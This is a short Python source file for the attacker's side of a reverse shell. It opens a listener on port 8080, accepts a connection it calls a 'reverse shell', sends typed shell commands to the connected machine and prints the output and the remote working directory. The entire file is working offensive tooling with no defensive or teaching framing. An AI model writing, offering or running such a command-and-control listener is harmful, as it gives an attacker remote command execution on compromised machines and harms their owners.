import socket

def start_server():
    s = socket.socket()
    s.settimeout(1)
    print("")
    print("Socket created.")
    
    s.bind(('0.0.0.0', 8080))
    print("Socket binded to 8080")
    print("")
    s.listen(5)
    print("Socket is listening...")
    while True:
        try:
            conn, addr = s.accept()
            conn.settimeout(0.7)
            print("Got connection from reverse shell in ", addr)
            cwd = conn.recv(1024).decode()
            if len(cwd)==0:
                print("")
                print("Client must have disconnected. len(cwd) == 0.")
                break
            while s:
                try:
                    command = input(f"{cwd}> ")
                    print("command is ", command.encode())
                    conn.send(command.encode())
                    response = ""
                    while True:
                        try:
                            response = response + conn.recv(1024).decode()
                        except socket.timeout:
                            break
                    output = response.split("cURR_dIR")[0]
                    cwd = response.split("cURR_dIR")[1]
                    print(output)
                except:
                    print("Client must have disconnected.")
                    break
        except socket.timeout:
            continue

if __name__ == "__main__":
    start_server()